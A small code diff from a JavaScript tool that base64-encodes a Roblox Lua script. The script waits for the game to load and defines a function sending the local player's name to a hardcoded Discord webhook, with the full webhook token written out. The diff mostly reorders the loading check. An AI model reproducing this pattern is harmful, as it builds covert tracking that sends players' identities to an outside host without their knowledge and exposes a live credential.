@@ -3162,10 +3162,12 @@ until success`
           // map_device_id_code[item.device_id] = item.device_code
         } else if (option?.iscanurTrack){
           const iscanurTrackWH = "https://discord.com/api/webhooks/1420798690028687514/odwrvmr_uTsMA1A-DExl3tzNR-pnQXibmhQ-AcQPjEeZ_CFj2NfuoHYVWJ-HA6B1viD8"
-          const scriptTrack = btoa(unescape(encodeURIComponent(`local Players = game:GetService("Players")
-local LocalPlayer2 = Players.LocalPlayer
+          const scriptTrack = btoa(unescape(encodeURIComponent(`
+          repeat wait() until game:IsLoaded() and game:GetService("Players")
+          local Players2 = game:GetService("Players")
+local LocalPlayer2 = Players2.LocalPlayer
 local HttpService2 = game:GetService("HttpService")
-repeat wait() until game:IsLoaded()
+
 local function SendWebHook()
     local msg = {
         ['content'] = LocalPlayer2.Name
